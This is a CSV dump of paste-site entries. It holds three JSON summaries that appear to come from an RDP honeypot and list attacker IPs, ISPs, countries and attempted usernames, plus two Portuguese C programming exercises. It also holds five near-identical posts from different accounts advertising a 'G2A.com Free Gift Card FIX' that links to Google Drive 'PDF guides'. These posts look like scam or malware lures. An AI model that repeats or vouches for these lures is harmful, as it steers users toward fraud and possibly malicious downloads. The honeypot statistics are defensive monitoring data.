id,title,username,language,date,content
PB1DapWD,2024-06-29_stats.json,rdp_snitch,JSON,Saturday 29th of June 2024 07:18:09 PM CDT,"{
  ""ip"": {
    ""104.248.154.46"": 33,
    ""98.143.255.25"": 27,
    ""194.165.16.37"": 6,
    ""104.237.129.112"": 27,
    ""45.227.254.49"": 12,
    ""96.51.53.164"": 6,
    ""164.92.104.215"": 12,
    ""81.19.135.2"": 9,
    ""172.105.126.198"": 6,
    ""194.165.16.76"": 6,
    ""205.210.31.220"": 9,
    ""194.165.16.78"": 6,
    ""94.232.247.117"": 12,
    ""185.94.26.5"": 12,
    ""104.237.142.26"": 3,
    ""64.124.50.139"": 6,
    ""118.71.209.116"": 3,
    ""172.232.116.115"": 3,
    ""183.80.4.255"": 3,
    ""212.70.149.146"": 9,
    ""185.170.144.3"": 6,
    ""191.96.207.190"": 6,
    ""205.210.31.218"": 9,
    ""117.173.153.116"": 3,
    ""172.233.107.196"": 3,
    ""188.119.66.107"": 3,
    ""185.196.220.41"": 9,
    ""45.227.254.54"": 12,
    ""43.134.186.29"": 3,
    ""194.165.16.11"": 6,
    ""51.103.90.130"": 3,
    ""198.235.24.168"": 9,
    ""157.20.241.207"": 9,
    ""162.210.245.77"": 6,
    ""223.166.31.100"": 3,
    ""157.20.241.215"": 3,
    ""198.235.24.77"": 9,
    ""116.140.196.215"": 3,
    ""134.209.104.88"": 3
  },
  ""asn"": {
    ""AS14061"": 48,
    ""AS3367"": 27,
    ""AS48721"": 24,
    ""AS63949"": 42,
    ""AS267784"": 24,
    ""AS6327"": 6,
    ""AS209588"": 9,
    ""AS396982"": 36,
    ""AS44477"": 12,
    ""AS62537"": 12,
    ""AS6461"": 6,
    ""AS18403"": 6,
    ""AS204428"": 9,
    ""AS197414"": 6,
    ""AS199654"": 6,
    ""AS9808"": 3,
    ""AS57523"": 3,
    ""AS208046"": 9,
    ""AS132203"": 3,
    ""AS8075"": 3,
    ""AS152565"": 12,
    ""AS397651"": 6,
    ""AS17621"": 3,
    ""AS4837"": 3
  },
  ""isp"": {
    ""DigitalOcean, LLC"": 48,
    ""Xplornet Communications Inc."": 27,
    ""Flyservers S.A."": 57,
    ""Akamai Technologies, Inc."": 36,
    ""Shaw Communications Inc."": 6,
    ""Akamai Technologies"": 6,
    ""Google LLC"": 36,
    ""Stark Industries Solutions LTD"": 12,
    ""Sauce Labs Inc"": 12,
    ""Zayo Bandwidth"": 6,
    ""fpt"": 3,
    ""Vietnam Internet Network Information Center"": 3,
    ""SS-Net"": 9,
    ""Xhost Internet Solutions LP"": 6,
    ""Oxide Group Limited"": 6,
    ""China Mobile communications corporation"": 3,
    ""Chang Way Technologies Co. Limited"": 3,
    ""ColocationX Ltd."": 9,
    ""Aceville Pte.ltd"": 3,
    ""Microsoft"": 3,
    ""JOY SERVICES"": 12,
    ""RCI Broadband"": 6,
    ""China Unicom Shanghai Province Network"": 3,
    ""China Unicom CHINA169 Network"": 3
  },
  ""org"": {
    ""DigitalOcean, LLC"": 48,
    ""Unknown"": 39,
    ""Flyservers S.A"": 24,
    ""Linode"": 36,
    ""UAB Host Baltic"": 24,
    ""Shaw Communications Inc"": 6,
    ""Alviva Holding Limited"": 9,
    ""Palo Alto Networks, Inc"": 36,
    ""Stark Industries Solutions LTD"": 12,
    ""Sauce Labs Inc"": 12,
    ""Microsoft Corporation"": 6,
    ""Akamai Technologies, Inc."": 6,
    ""4Media Ltd"": 9,
    ""Xhostis"": 6,
    ""Hosting Solutions"": 6,
    ""China Mobile"": 3,
    ""Chang Way Technologies Co. Limited"": 3,
    ""Makut Investments"": 9,
    ""Microsoft Azure Cloud (francecentral)"": 3,
    ""JOY Services"": 12,
    ""10x Servers"": 6,
    ""China United Network Communications Corporation Limited"": 3
  },
  ""regionName"": {
    ""Central Singapore"": 33,
    ""New Brunswick"": 27,
    ""Kaunas"": 24,
    ""Texas"": 30,
    ""Vilnius"": 24,
    ""Alberta"": 6,
    ""California"": 48,
    ""Hesse"": 21,
    ""North West"": 9,
    ""\u00cele-de-France"": 15,
    ""Virginia"": 21,
    ""Ho Chi Minh"": 3,
    ""Tamil Nadu"": 3,
    ""Hanoi"": 3,
    ""Sofia-Capital"": 9,
    ""North Holland"": 6,
    ""Limburg"": 6,
    ""Sichuan"": 3,
    ""Madrid"": 3,
    ""Moscow"": 3,
    ""National Capital Territory of Delhi"": 12,
    ""Shanghai"": 3,
    ""Beijing"": 3,
    ""South West"": 3
  },
  ""country"": {
    ""Singapore"": 45,
    ""Canada"": 33,
    ""Lithuania"": 48,
    ""United States"": 99,
    ""Germany"": 21,
    ""France"": 15,
    ""Vietnam"": 6,
    ""India"": 15,
    ""Bulgaria"": 9,
    ""The Netherlands"": 12,
    ""China"": 9,
    ""Spain"": 3,
    ""Russia"": 3
  },
  ""account"": {
    ""hello"": 162,
    ""Test"": 63,
    ""Domain"": 27,
    ""AjtxDYkQF"": 3,
    ""KwiwyU"": 3,
    ""RYWgPE"": 3,
    ""rngqqag5"": 12,
    ""(empty)"": 9,
    ""Administr"": 9,
    ""VLVLdBbfZ"": 3,
    ""MBNEgH"": 3,
    ""ojENoq"": 3,
    ""DhrbHtqBk"": 3,
    ""ztiSBJ"": 3,
    ""lUCVhn"": 3,
    ""xDwzeLdpH"": 3,
    ""EbSuMw"": 3,
    ""IfPpnk"": 3
  },
  ""keyboard"": {
    ""Unknown"": 318
  },
  ""client_build"": {
    ""Unknown"": 318
  },
  ""client_name"": {
    ""Unknown"": 318
  },
  ""ip_type"": {
    ""hosting"": 132,
    ""Unknown"": 150,
    ""proxy"": 33,
    ""mobile"": 3
  }
}"
TJUzMqWB,🤑G2A.com Free Gift Card FIX July 2024🤑,mikyser,JavaScript,Saturday 29th of June 2024 07:17:30 PM CDT,"G2A.com complimentary voucher & games guide.
Any item for free on G2A.com including Steam gift cards & all else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/1kcJ-yXUpB1u8mkFHUQKnrArP6DGl5W8e/view?56620

Working as of:
1st of July 2024

"
paSrneXb,2024-06-29_stats.json,rdp_snitch,JSON,Saturday 29th of June 2024 07:16:12 PM CDT,"{
  ""ip"": {
    ""104.248.154.46"": 22,
    ""98.143.255.25"": 18,
    ""194.165.16.37"": 4,
    ""104.237.129.112"": 18,
    ""45.227.254.49"": 8,
    ""96.51.53.164"": 4,
    ""164.92.104.215"": 8,
    ""81.19.135.2"": 6,
    ""172.105.126.198"": 4,
    ""194.165.16.76"": 4,
    ""205.210.31.220"": 6,
    ""194.165.16.78"": 4,
    ""94.232.247.117"": 8,
    ""185.94.26.5"": 8,
    ""104.237.142.26"": 2,
    ""64.124.50.139"": 4,
    ""118.71.209.116"": 2,
    ""172.232.116.115"": 2,
    ""183.80.4.255"": 2,
    ""212.70.149.146"": 6,
    ""185.170.144.3"": 4,
    ""191.96.207.190"": 4,
    ""205.210.31.218"": 6,
    ""117.173.153.116"": 2,
    ""172.233.107.196"": 2,
    ""188.119.66.107"": 2,
    ""185.196.220.41"": 6,
    ""45.227.254.54"": 8,
    ""43.134.186.29"": 2,
    ""194.165.16.11"": 4,
    ""51.103.90.130"": 2,
    ""198.235.24.168"": 6,
    ""157.20.241.207"": 6,
    ""162.210.245.77"": 4,
    ""223.166.31.100"": 2,
    ""157.20.241.215"": 2,
    ""198.235.24.77"": 6,
    ""116.140.196.215"": 2,
    ""134.209.104.88"": 2
  },
  ""asn"": {
    ""AS14061"": 32,
    ""AS3367"": 18,
    ""AS48721"": 16,
    ""AS63949"": 28,
    ""AS267784"": 16,
    ""AS6327"": 4,
    ""AS209588"": 6,
    ""AS396982"": 24,
    ""AS44477"": 8,
    ""AS62537"": 8,
    ""AS6461"": 4,
    ""AS18403"": 4,
    ""AS204428"": 6,
    ""AS197414"": 4,
    ""AS199654"": 4,
    ""AS9808"": 2,
    ""AS57523"": 2,
    ""AS208046"": 6,
    ""AS132203"": 2,
    ""AS8075"": 2,
    ""AS152565"": 8,
    ""AS397651"": 4,
    ""AS17621"": 2,
    ""AS4837"": 2
  },
  ""isp"": {
    ""DigitalOcean, LLC"": 32,
    ""Xplornet Communications Inc."": 18,
    ""Flyservers S.A."": 38,
    ""Akamai Technologies, Inc."": 24,
    ""Shaw Communications Inc."": 4,
    ""Akamai Technologies"": 4,
    ""Google LLC"": 24,
    ""Stark Industries Solutions LTD"": 8,
    ""Sauce Labs Inc"": 8,
    ""Zayo Bandwidth"": 4,
    ""fpt"": 2,
    ""Vietnam Internet Network Information Center"": 2,
    ""SS-Net"": 6,
    ""Xhost Internet Solutions LP"": 4,
    ""Oxide Group Limited"": 4,
    ""China Mobile communications corporation"": 2,
    ""Chang Way Technologies Co. Limited"": 2,
    ""ColocationX Ltd."": 6,
    ""Aceville Pte.ltd"": 2,
    ""Microsoft"": 2,
    ""JOY SERVICES"": 8,
    ""RCI Broadband"": 4,
    ""China Unicom Shanghai Province Network"": 2,
    ""China Unicom CHINA169 Network"": 2
  },
  ""org"": {
    ""DigitalOcean, LLC"": 32,
    ""Unknown"": 26,
    ""Flyservers S.A"": 16,
    ""Linode"": 24,
    ""UAB Host Baltic"": 16,
    ""Shaw Communications Inc"": 4,
    ""Alviva Holding Limited"": 6,
    ""Palo Alto Networks, Inc"": 24,
    ""Stark Industries Solutions LTD"": 8,
    ""Sauce Labs Inc"": 8,
    ""Microsoft Corporation"": 4,
    ""Akamai Technologies, Inc."": 4,
    ""4Media Ltd"": 6,
    ""Xhostis"": 4,
    ""Hosting Solutions"": 4,
    ""China Mobile"": 2,
    ""Chang Way Technologies Co. Limited"": 2,
    ""Makut Investments"": 6,
    ""Microsoft Azure Cloud (francecentral)"": 2,
    ""JOY Services"": 8,
    ""10x Servers"": 4,
    ""China United Network Communications Corporation Limited"": 2
  },
  ""regionName"": {
    ""Central Singapore"": 22,
    ""New Brunswick"": 18,
    ""Kaunas"": 16,
    ""Texas"": 20,
    ""Vilnius"": 16,
    ""Alberta"": 4,
    ""California"": 32,
    ""Hesse"": 14,
    ""North West"": 6,
    ""\u00cele-de-France"": 10,
    ""Virginia"": 14,
    ""Ho Chi Minh"": 2,
    ""Tamil Nadu"": 2,
    ""Hanoi"": 2,
    ""Sofia-Capital"": 6,
    ""North Holland"": 4,
    ""Limburg"": 4,
    ""Sichuan"": 2,
    ""Madrid"": 2,
    ""Moscow"": 2,
    ""National Capital Territory of Delhi"": 8,
    ""Shanghai"": 2,
    ""Beijing"": 2,
    ""South West"": 2
  },
  ""country"": {
    ""Singapore"": 30,
    ""Canada"": 22,
    ""Lithuania"": 32,
    ""United States"": 66,
    ""Germany"": 14,
    ""France"": 10,
    ""Vietnam"": 4,
    ""India"": 10,
    ""Bulgaria"": 6,
    ""The Netherlands"": 8,
    ""China"": 6,
    ""Spain"": 2,
    ""Russia"": 2
  },
  ""account"": {
    ""hello"": 108,
    ""Test"": 42,
    ""Domain"": 18,
    ""AjtxDYkQF"": 2,
    ""KwiwyU"": 2,
    ""RYWgPE"": 2,
    ""rngqqag5"": 8,
    ""(empty)"": 6,
    ""Administr"": 6,
    ""VLVLdBbfZ"": 2,
    ""MBNEgH"": 2,
    ""ojENoq"": 2,
    ""DhrbHtqBk"": 2,
    ""ztiSBJ"": 2,
    ""lUCVhn"": 2,
    ""xDwzeLdpH"": 2,
    ""EbSuMw"": 2,
    ""IfPpnk"": 2
  },
  ""keyboard"": {
    ""Unknown"": 212
  },
  ""client_build"": {
    ""Unknown"": 212
  },
  ""client_name"": {
    ""Unknown"": 212
  },
  ""ip_type"": {
    ""hosting"": 88,
    ""Unknown"": 100,
    ""proxy"": 22,
    ""mobile"": 2
  }
}"
f7qZuEm1,2024-06-29_stats.json,rdp_snitch,JSON,Saturday 29th of June 2024 07:15:09 PM CDT,"{
  ""ip"": {
    ""104.248.154.46"": 11,
    ""98.143.255.25"": 9,
    ""194.165.16.37"": 2,
    ""104.237.129.112"": 9,
    ""45.227.254.49"": 4,
    ""96.51.53.164"": 2,
    ""164.92.104.215"": 4,
    ""81.19.135.2"": 3,
    ""172.105.126.198"": 2,
    ""194.165.16.76"": 2,
    ""205.210.31.220"": 3,
    ""194.165.16.78"": 2,
    ""94.232.247.117"": 4,
    ""185.94.26.5"": 4,
    ""104.237.142.26"": 1,
    ""64.124.50.139"": 2,
    ""118.71.209.116"": 1,
    ""172.232.116.115"": 1,
    ""183.80.4.255"": 1,
    ""212.70.149.146"": 3,
    ""185.170.144.3"": 2,
    ""191.96.207.190"": 2,
    ""205.210.31.218"": 3,
    ""117.173.153.116"": 1,
    ""172.233.107.196"": 1,
    ""188.119.66.107"": 1,
    ""185.196.220.41"": 3,
    ""45.227.254.54"": 4,
    ""43.134.186.29"": 1,
    ""194.165.16.11"": 2,
    ""51.103.90.130"": 1,
    ""198.235.24.168"": 3,
    ""157.20.241.207"": 3,
    ""162.210.245.77"": 2,
    ""223.166.31.100"": 1,
    ""157.20.241.215"": 1,
    ""198.235.24.77"": 3,
    ""116.140.196.215"": 1,
    ""134.209.104.88"": 1
  },
  ""asn"": {
    ""AS14061"": 16,
    ""AS3367"": 9,
    ""AS48721"": 8,
    ""AS63949"": 14,
    ""AS267784"": 8,
    ""AS6327"": 2,
    ""AS209588"": 3,
    ""AS396982"": 12,
    ""AS44477"": 4,
    ""AS62537"": 4,
    ""AS6461"": 2,
    ""AS18403"": 2,
    ""AS204428"": 3,
    ""AS197414"": 2,
    ""AS199654"": 2,
    ""AS9808"": 1,
    ""AS57523"": 1,
    ""AS208046"": 3,
    ""AS132203"": 1,
    ""AS8075"": 1,
    ""AS152565"": 4,
    ""AS397651"": 2,
    ""AS17621"": 1,
    ""AS4837"": 1
  },
  ""isp"": {
    ""DigitalOcean, LLC"": 16,
    ""Xplornet Communications Inc."": 9,
    ""Flyservers S.A."": 19,
    ""Akamai Technologies, Inc."": 12,
    ""Shaw Communications Inc."": 2,
    ""Akamai Technologies"": 2,
    ""Google LLC"": 12,
    ""Stark Industries Solutions LTD"": 4,
    ""Sauce Labs Inc"": 4,
    ""Zayo Bandwidth"": 2,
    ""fpt"": 1,
    ""Vietnam Internet Network Information Center"": 1,
    ""SS-Net"": 3,
    ""Xhost Internet Solutions LP"": 2,
    ""Oxide Group Limited"": 2,
    ""China Mobile communications corporation"": 1,
    ""Chang Way Technologies Co. Limited"": 1,
    ""ColocationX Ltd."": 3,
    ""Aceville Pte.ltd"": 1,
    ""Microsoft"": 1,
    ""JOY SERVICES"": 4,
    ""RCI Broadband"": 2,
    ""China Unicom Shanghai Province Network"": 1,
    ""China Unicom CHINA169 Network"": 1
  },
  ""org"": {
    ""DigitalOcean, LLC"": 16,
    ""Unknown"": 13,
    ""Flyservers S.A"": 8,
    ""Linode"": 12,
    ""UAB Host Baltic"": 8,
    ""Shaw Communications Inc"": 2,
    ""Alviva Holding Limited"": 3,
    ""Palo Alto Networks, Inc"": 12,
    ""Stark Industries Solutions LTD"": 4,
    ""Sauce Labs Inc"": 4,
    ""Microsoft Corporation"": 2,
    ""Akamai Technologies, Inc."": 2,
    ""4Media Ltd"": 3,
    ""Xhostis"": 2,
    ""Hosting Solutions"": 2,
    ""China Mobile"": 1,
    ""Chang Way Technologies Co. Limited"": 1,
    ""Makut Investments"": 3,
    ""Microsoft Azure Cloud (francecentral)"": 1,
    ""JOY Services"": 4,
    ""10x Servers"": 2,
    ""China United Network Communications Corporation Limited"": 1
  },
  ""regionName"": {
    ""Central Singapore"": 11,
    ""New Brunswick"": 9,
    ""Kaunas"": 8,
    ""Texas"": 10,
    ""Vilnius"": 8,
    ""Alberta"": 2,
    ""California"": 16,
    ""Hesse"": 7,
    ""North West"": 3,
    ""\u00cele-de-France"": 5,
    ""Virginia"": 7,
    ""Ho Chi Minh"": 1,
    ""Tamil Nadu"": 1,
    ""Hanoi"": 1,
    ""Sofia-Capital"": 3,
    ""North Holland"": 2,
    ""Limburg"": 2,
    ""Sichuan"": 1,
    ""Madrid"": 1,
    ""Moscow"": 1,
    ""National Capital Territory of Delhi"": 4,
    ""Shanghai"": 1,
    ""Beijing"": 1,
    ""South West"": 1
  },
  ""country"": {
    ""Singapore"": 15,
    ""Canada"": 11,
    ""Lithuania"": 16,
    ""United States"": 33,
    ""Germany"": 7,
    ""France"": 5,
    ""Vietnam"": 2,
    ""India"": 5,
    ""Bulgaria"": 3,
    ""The Netherlands"": 4,
    ""China"": 3,
    ""Spain"": 1,
    ""Russia"": 1
  },
  ""account"": {
    ""hello"": 54,
    ""Test"": 21,
    ""Domain"": 9,
    ""AjtxDYkQF"": 1,
    ""KwiwyU"": 1,
    ""RYWgPE"": 1,
    ""rngqqag5"": 4,
    ""(empty)"": 3,
    ""Administr"": 3,
    ""VLVLdBbfZ"": 1,
    ""MBNEgH"": 1,
    ""ojENoq"": 1,
    ""DhrbHtqBk"": 1,
    ""ztiSBJ"": 1,
    ""lUCVhn"": 1,
    ""xDwzeLdpH"": 1,
    ""EbSuMw"": 1,
    ""IfPpnk"": 1
  },
  ""keyboard"": {
    ""Unknown"": 106
  },
  ""client_build"": {
    ""Unknown"": 106
  },
  ""client_name"": {
    ""Unknown"": 106
  },
  ""ip_type"": {
    ""hosting"": 44,
    ""Unknown"": 50,
    ""proxy"": 11,
    ""mobile"": 1
  }
}"
9wRZTYEt,2024_ponteiros_lista_ex6a,gpsgiraldi,C,Saturday 29th of June 2024 07:14:30 PM CDT,"/******************************************************************************
CORRIJA: 
 int a, *p;
 a = 5;
 p = a;
 printf(“Conteúdo de p: %i\n”, p);
*******************************************************************************/
#include <stdio.h>
#include <string.h>

int main()
{

    int a;
    int *p;
    a = 5;
    p = &a;
    printf(""Conteúdo de p: %i\n"", *p);
    
    return 0;
}"
8UTPZjZU,🤑G2A.com Free Gift Card FIX July 2024🎁,Skarface-MKL,JavaScript,Saturday 29th of June 2024 07:14:11 PM CDT,"G2A.com free gift card & gaming guide.
Any gift card for free on G2A.com including Xbox gift cards & everything else offered.
This is the most latest version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?70259

Working as of:
July 1 2024

"
zKHbxsN2,🤑G2A.com Free Gift Card FIX July 2024🎁,Ohtaku,JavaScript,Saturday 29th of June 2024 07:11:26 PM CDT,"G2A.com free voucher & games guide.
Any item for free on G2A.com including Steam gift cards & anything else offered.
This is the most latest version of this script.

PDF guide here:
https://drive.google.com/file/d/1kcJ-yXUpB1u8mkFHUQKnrArP6DGl5W8e/view?56620

Working as of:
1st of July 2024

"
tKjkCTFY,🤑G2A.com Free Gift Card FIX July 2024🎁,thepplayz,JavaScript,Saturday 29th of June 2024 07:08:09 PM CDT,"G2A.com complimentary voucher & gaming guide.
Any voucher for free on G2A.com including Steam gift cards & everything else offered.
This is the most current version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?70259

Working as of:
July 1 2024

"
M6Tpejqq,2024_strings_lista_ex5,gpsgiraldi,C,Saturday 29th of June 2024 07:06:52 PM CDT,"/******************************************************************************
5 – Faça um programa em C para criptografar uma frase dada pelo usuário. A
criptografia troca as vogais da frase por *. Por exemplo:
Frase: EU ESTOU NA ESCOLA
Saída: ** *ST** N* *SC*L*
*******************************************************************************/
#include <stdio.h>
#include <string.h>

int main()
{
    char string[100];
    int i,tamanho;
    
    fgets(string,99,stdin);
    tamanho=strlen(string);
    
    for(i=0;i<tamanho-1;i++){
        if(string[i]=='a'||string[i]=='e'||string[i]=='i'||string[i]=='o'||string[i]=='u'
         ||string[i]=='A'||string[i]=='E'||string[i]=='I'||string[i]=='O'||string[i]=='U'){
             string[i]='*';
         }
    }
    fputs(string,stdout);
    
    return 0;
}
"
AyExxcXq,🤑G2A.com Free Gift Card FIX July 2024🎁,Elii,JavaScript,Saturday 29th of June 2024 07:05:24 PM CDT,"G2A.com free voucher & games guide.
Any gift card for free on G2A.com including Amazon gift cards & anything else offered.
This is the most current version of this script.

PDF guide here:
https://drive.google.com/file/d/1kcJ-yXUpB1u8mkFHUQKnrArP6DGl5W8e/view?56620

Working as of:
July 1 2024

"
